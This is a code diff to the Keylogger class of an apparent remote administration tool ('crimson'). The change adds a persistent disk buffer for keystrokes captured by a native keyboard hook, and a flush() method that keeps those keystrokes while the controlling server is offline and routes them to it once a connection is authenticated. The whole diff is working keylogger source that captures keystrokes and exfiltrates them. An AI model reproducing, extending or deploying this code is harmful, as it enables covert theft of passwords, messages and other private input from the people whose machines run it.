@@ -28,9 +28,13 @@ import org.jnativehook.keyboard.NativeKeyListener;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.subterranean_security.crimson.client.net.ClientCommands;
-import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
+import com.subterranean_security.crimson.client.Client;
+import com.subterranean_security.crimson.client.ClientStore;
+import com.subterranean_security.crimson.core.net.ConnectionState;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
+import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
+import com.subterranean_security.crimson.core.proto.MSG.Message;
+import com.subterranean_security.crimson.core.storage.MemList;
 import com.subterranean_security.crimson.core.util.Native;
 
 public final class Keylogger {
@@ -41,9 +45,14 @@ public final class Keylogger {
 	}
 
 	/**
-	 * Keybuffer that stores results from native hook
+	 * Keybuffer that stores results directly from native hook
 	 */
 	public static ArrayList<EV_KEvent> buffer = new ArrayList<EV_KEvent>();
+
+	/**
+	 * Keybuffer that stores results persistently if server is not connected
+	 */
+	private static MemList<EV_KEvent> diskBuffer = null;
 
 	/**
 	 * Thread that monitors the keybuffer for changes
@@ -71,6 +80,13 @@ public final class Keylogger {
 		stop();
 		log.info("Starting keylogger");
 
+		try {
+			diskBuffer = (MemList<EV_KEvent>) Client.clientDB.getObject("keylogger.buffer");
+			diskBuffer.setDatabase(Client.clientDB);
+		} catch (Exception e) {
+			log.error("Failed to initialize persistent key buffer");
+		}
+
 		monitor = new Thread(new Runnable() {
 			public void run() {
 				try {
@@ -83,7 +99,7 @@ public final class Keylogger {
 							}
 
 							if (buffer.size() > value) {
-								ClientCommands.flushKeybuffer();
+								flush();
 							}
 
 						}
@@ -91,7 +107,7 @@ public final class Keylogger {
 					case TIME:
 						while (!Thread.currentThread().isInterrupted()) {
 							Thread.sleep(value * 1000);
-							ClientCommands.flushKeybuffer();
+							flush();
 
 						}
 						break;
@@ -138,6 +154,7 @@ public final class Keylogger {
 		} catch (NativeHookException e) {
 		}
 
+		flush();
 	}
 
 	/**
@@ -147,6 +164,26 @@ public final class Keylogger {
 	 */
 	public static boolean isLogging() {
 		return monitor == null ? false : (monitor.isAlive() && GlobalScreen.isNativeHookRegistered());
+	}
+
+	/**
+	 * Flushes the in-memory buffer either to the server or to persistent
+	 * storage
+	 */
+	public static synchronized void flush() {
+		if (ClientStore.Connections.getServerConnectionState() != ConnectionState.AUTHENTICATED) {
+			while (buffer.size() > 0) {
+				diskBuffer.add(buffer.remove(0));
+			}
+		} else {
+			while (diskBuffer.size() > 0) {
+				ClientStore.Connections.route(Message.newBuilder().setUrgent(true).setEvKevent(diskBuffer.remove(0)));
+			}
+			while (buffer.size() > 0) {
+				ClientStore.Connections.route(Message.newBuilder().setUrgent(true).setEvKevent(buffer.remove(0)));
+			}
+		}
+
 	}
 
 }
